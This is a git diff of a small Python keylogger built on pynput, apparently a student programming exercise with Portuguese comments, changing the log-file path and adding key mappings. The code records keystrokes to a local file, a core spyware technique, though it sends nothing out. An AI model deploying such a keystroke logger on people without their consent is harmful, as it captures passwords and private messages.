@@ -1,8 +1,10 @@
 #em pynput, importar o método Listener do teclado
 from pynput.keyboard import Listener
 
+
+
 #definir a localização do arquivo de log
-logFile = "C:\Users\AULA-1\Desktop\listen\log.txt"
+logFile = "C:\\Users\\AULA-1\\Documents\\(Engenharia de Software)\\Fase 1\\Linguagem de Programação\\Programa-o_em_Python\\log.txt"
 
 def writeLog(key):
     '''
@@ -20,6 +22,13 @@ def writeLog(key):
         "Key.esc": "",
         "Key.cmd": "",
         "Key.caps_lock": "",
+        "Key.backspace": " ",
+        "Key.shift": "",
+        "Key.right":"",
+        "Key.left":"",
+        "Key.shift":"",
+        "Key.ctrl_l":"",
+        "Key.ctrl_l\x13":"#(ARQUIVO SALVO)#",
     }
 
     #converter a tecla pressionada para string
